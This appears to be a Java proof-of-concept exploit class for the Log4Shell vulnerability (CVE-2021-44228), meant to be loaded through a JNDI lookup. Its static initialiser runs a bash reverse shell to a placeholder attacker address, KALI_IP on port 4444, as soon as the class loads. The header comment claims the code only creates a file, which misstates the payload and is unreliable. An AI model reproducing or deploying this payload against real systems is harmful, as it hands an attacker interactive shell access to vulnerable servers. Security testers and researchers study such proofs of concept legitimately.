/*
	 Author: Adam New
	 Date:   12th January 2025
	 About:  POC for CVE-2021-44228.

	 This simple code only creates a file on the attacked filesystem.

*/
import java.io.FileWriter;
import java.io.IOException;
import javax.naming.spi.ObjectFactory;
import javax.naming.Context;
import javax.naming.Name;
import java.util.Hashtable;

public class Exploit implements ObjectFactory {
	  // Static code that will allow the RCE once that the JVM load the class.
    static {
        try {
		String[] cmd = {"/bin/bash", "-c", "bash -i >& /dev/tcp/KALI_IP/4444 0>&1"};
		Runtime.getRuntime().exec(cmd);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

	public static void main(String[] args){
		return;
	}
	@Override
	public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) {
		return null;
	}
}
